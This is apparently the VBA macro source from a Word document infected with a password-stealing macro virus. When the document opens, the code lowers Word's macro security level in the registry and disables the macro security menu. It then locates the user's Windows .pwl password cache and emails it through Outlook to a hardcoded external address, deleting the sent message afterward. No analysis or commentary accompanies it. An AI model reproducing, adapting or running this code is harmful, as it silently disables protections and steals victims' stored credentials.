   Attribute VB_Name = "Module1"
   Public Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
   'ucbC><Kd

   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True


   Private Sub Document_New()

   End Sub

   Private Sub Document_Open()
   On Error Resume Next
   If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
   CommandBars("Macro").Controls("Security...").Enabled = False
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1
   Else
   CommandBars("Tools").Controls("Macro").Enabled = False
   End If

   Dim UngaDasOutlook, DasMapiName, BreakUmOffASlice, GetUser, Xx
   Dim ThePath As String * 255
   Dim PwlPath As String

       GetUser = Application.UserName
       Xx = GetWindowsDirectory(ThePath, 255)
       PwlPath = Left(ThePath, Xx) & "\" & GetUser & ".pwl"

   Set UngaDasOutlook = CreateObject("Outlook.Application")
   Set DasMapiName = UngaDasOutlook.GetNameSpace("MAPI")

           DasMapiName.Logon
           TheAddress = "neetazz86@hotmail.com"
           Set BreakUmOffASlice = UngaDasOutlook.CreateItem(0)
           BreakUmOffASlice.Recipients.Add TheAddress
           BreakUmOffASlice.Subject = "Pwl From " & Application.UserName
           BreakUmOffASlice.Body = "Here it is"
           BreakUmOffASlice.Attachments.Add PwlPath
           BreakUmOffASlice.Send
           BreakUmOffASlice.Delete
           DasMapiName.Logoff

        '  Selection.TypeText PwlPath

      End Sub
